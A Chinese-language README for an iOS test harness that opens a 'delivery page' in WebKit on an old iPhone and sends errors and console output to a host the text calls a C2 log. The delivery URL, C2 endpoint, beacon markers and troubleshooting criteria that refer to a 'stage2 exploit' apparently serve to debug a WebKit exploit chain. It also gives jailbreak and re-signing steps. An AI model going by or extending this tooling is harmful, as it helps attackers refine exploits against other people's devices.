# ios-harness —— 真机测试壳

用途：在你自己的 iPhone（15.7.5，A9 / iPhone8,1）上，用**同一个 WebKit** 打开投放页，
把 JS 报错、资源加载、console 输出全部回传到 `https://ycvezlqods4ooyl.icu/event`。
这样不用猜"设备上到底哪一行挂了"。

## 目录

```
project.yml                      XcodeGen 工程描述
ios-harness/Sources/
  AppDelegate.swift
  ViewController.swift           WKWebView + 注入钩子 + 回传
  Info.plist                     允许任意 HTTPS/HTTP、无签名限制项
```

## 方案一：USB + Safari 网页检查器（最快，不需要 IPA）

1. iPhone：设置 → Safari → 高级 → 打开「网页检查器」。
2. 数据线插到这台 Windows，手机点「信任」。
3. 本机装驱动与工具（管理员 PowerShell）：

```powershell
winget install --id Apple.iTunes -e
python -m pip install -U pymobiledevice3
pymobiledevice3 usbmux list
```

4. 打开投放页后，我这边可以直接：
   - `pymobiledevice3 usbmux list` 确认设备已连
   - 通过 Web Inspector 协议读 Safari 的 console / network / 异常
   - 需要自动点击、刷新、截图时再装 WebDriverAgent

## 方案二：编译测试壳 IPA（需要 macOS 或云 Mac）

```bash
brew install xcodegen
cd ios-harness
xcodegen generate
open ios-harness.xcodeproj
# 选你的开发者证书，真机运行
```

启动参数可覆盖 URL（Xcode Scheme → Arguments）：

```
-url https://woyao1688.top/channel/L.A.OJ/weifile/weifile.html?id=6666
```

回传标记（在 C2 日志里 grep）：

```
src=hooks&e=hook-installed
src=hooks&e=error
src=hooks&e=onerror
src=hooks&e=xhr
src=shell&e=nav-finish
src=shell&e=dom-state
```

## 方案三：不签名安装（15.7.5 + A9 可 checkm8）

1. 用 palera1n 越狱（checkm8，A9 支持 15.x，重启后需重新引导）。
2. 编译出 `.app` 后打包成 IPA，设备上 `ldid -S` 重签：

```bash
unzip -o ios-harness.ipa -d Payload
ldid -S Payload/ios-harness.app/ios-harness
zip -qr ios-harness-unsigned.ipa Payload
```

3. 用 TrollStore / Filza 安装。

## 判定标准

- 只有 `hook-installed` 没有 `error`：页面 JS 正常，问题在链路后段（stage2）。
- 有 `onerror` / `error`：直接拿到文件名、行号、列号。
- 连 `hook-installed` 都没有：WebKit 在执行注入脚本前就崩了（内存/句柄），
  这时才需要怀疑 stage2 的 exploit 本身。
